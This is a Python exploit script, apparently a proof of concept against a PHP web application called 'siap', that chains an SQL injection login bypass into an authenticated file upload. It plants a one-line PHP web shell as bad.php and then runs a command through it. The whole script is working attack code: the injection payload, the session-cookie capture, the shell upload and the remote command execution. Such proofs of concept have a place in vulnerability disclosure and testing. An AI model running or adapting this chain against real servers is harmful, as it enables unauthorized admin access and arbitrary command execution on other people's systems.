# Chaining SQLi (Login Bypass) -> File Upload
import requests

login_url = 'http://localhost/siap/admin/cek.php'
upload_url = 'http://localhost/siap/admin/tambahKP.php'
shell_url = 'http://localhost/siap/image/koleksi/bad.php?1=whoami'

payload = "'or '1'='1-- -"

header = {'Content-Type':'application/x-www-form-urlencoded'}

body_data = f'username=admin{payload}&password=a&login=LOGIN'

print("[i] Bypassing Login")
r = requests.post(url=login_url, data=body_data, headers=header)
if 'PHPSESSID' in r.cookies:
    print('[+] Success, getting admin cookie')
    phpsessid = r.cookies['PHPSESSID']
else:
    print('[-] PHPSESSID not found')

cookies = {'PHPSESSID':phpsessid}

pshell = '<?=`$_GET[1]`?>'

form_data = {
    'judul': (None, 'KP-EvilShell'),
    'penulis': (None,'Ardias'),
    'nim': (None,'1337'),
    'jurusan': (None,'Teknik Sipil'),
    'dosbimKP': (None, ' RDX'),
    'dosbimKP1': (None, 'ARDX'),
    'subjek': (None, 'YesSir'),
    'barcode': (None, '1337'),
    'accno': (None, '1337'),
    'laporan': ('bad.php', pshell, 'application/x-php'),
    'simpan': (None, 'Tambah')
}

print('[i] Upload Shell')
r = requests.post(url=upload_url, files=form_data, cookies=cookies)
if 'Berhasil Ditambahkan !' in r.text:
    print('[+] File Uploaded!')
else:
    print('[-] Failed to upload :(')

print(f'[i] Accessing Shell url in: {shell_url}')
r = requests.get(url=shell_url)
print('Resp:',r.text)
